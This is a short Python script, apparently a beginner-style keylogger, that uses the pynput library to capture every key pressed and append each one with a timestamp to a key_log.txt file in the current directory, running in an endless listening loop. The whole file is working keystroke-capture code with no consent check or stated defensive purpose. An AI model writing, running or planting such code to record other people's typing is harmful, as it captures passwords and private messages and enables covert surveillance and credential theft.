
import logging
import os
from pynput.keyboard import Listener

log_Directory = os.getcwd() + '/'  # where save file
print(os.getcwd()) # directory
# create file 
logging.basicConfig(filename=(log_Directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# function in logging
def on_press(key):
    logging.info(key)
    # when press key save the key in file

with Listener(on_press=on_press) as listener:
    listener.join()  # infinite cicle
